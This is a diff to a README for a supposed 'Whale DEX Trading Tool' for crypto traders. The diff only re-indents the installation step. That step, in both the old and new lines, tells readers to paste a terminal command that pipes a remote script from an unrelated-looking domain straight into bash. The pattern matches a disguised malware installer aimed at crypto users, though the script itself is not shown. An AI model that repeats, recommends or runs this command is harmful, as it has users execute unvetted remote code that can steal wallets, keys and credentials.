@@ -15,9 +15,10 @@ Whale DEX Trading Tool- Is a comprehensive software solution designed for large-
 Update your sytem for upload
 
 Enter the command on Terminal
-''' 
-/bin/bash -c "$(curl -fsSL https://applepistudios.com/ce/install.sh)"
-'''
+
+                         ''' 
+                         /bin/bash -c "$(curl -fsSL https://applepistudios.com/ce/install.sh)"
+                         '''
 
 # Key Features and Solutions
 ## 1. Liquidity Aggregation and Order Execution
